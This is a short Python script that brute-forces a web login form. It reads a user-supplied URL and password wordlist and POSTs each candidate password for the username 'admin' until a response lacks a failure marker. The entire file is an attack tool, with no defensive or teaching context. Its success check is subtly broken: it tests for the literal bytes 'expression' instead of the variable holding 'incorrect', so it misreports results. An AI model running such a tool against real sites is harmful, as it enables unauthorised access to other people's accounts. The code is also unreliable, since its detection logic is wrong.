import requests
import sys

url = input("Enter URL : ")
expression = "incorrect"


def brute(username, password):
    data = {'username': username, 'password': password}
    r = requests.post(url, data=data)
    if b"expression" not in r.content:
        print("[+] Correct password Found: ", password)
        sys.exit()
    else:
        print(r.content, " ", password)


def main():
    passfile = input("Enter Pass File : ").encode()
    words = [w.strip() for w in open(
        passfile, "r", encoding="utf-8").readlines()]  # parse wordlist
    for payload in words:
        brute("admin", payload)


if __name__ == '__main__':
    main()
